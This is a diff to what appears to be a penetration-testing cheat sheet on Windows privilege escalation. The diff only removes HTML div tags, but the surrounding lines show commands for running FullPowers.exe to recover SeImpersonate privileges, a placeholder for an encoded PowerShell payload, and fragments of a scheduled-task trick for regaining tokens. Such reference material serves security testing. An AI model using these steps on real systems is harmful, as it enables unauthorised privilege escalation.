@@ -6,8 +6,6 @@ tags: ["SeImpresonate", "Windows", "potato", "privesc", "fullpower"]
 
 ### Abuse #1: Recover SeImpresonate
 
-<div>
-
 ```console
 .\FullPowers.exe -c "whoami /priv"
 ```
@@ -17,13 +15,9 @@ tags: ["SeImpresonate", "Windows", "potato", "privesc", "fullpower"]
 .\FullPowers.exe -c "<POWERSHELL_3_BASE64>"
 ```
 
-</div>
-
 <small>*Ref: [FullPower](https://github.com/itm4n/FullPowers/releases/tag/v0.1)*</small>
 
 ### Abuse #2: Recover tokens via schedule task
-
-<div>
 
 ```console
 # Create a list of privileges 
@@ -49,7 +43,3 @@ Register-ScheduledTask -Action $TaskAction -TaskName "SomeTask" -Principal $Task
 # Start the task
 Start-ScheduledTask -TaskName "SomeTask"
 ```
-
-</div>
- 
-<br>
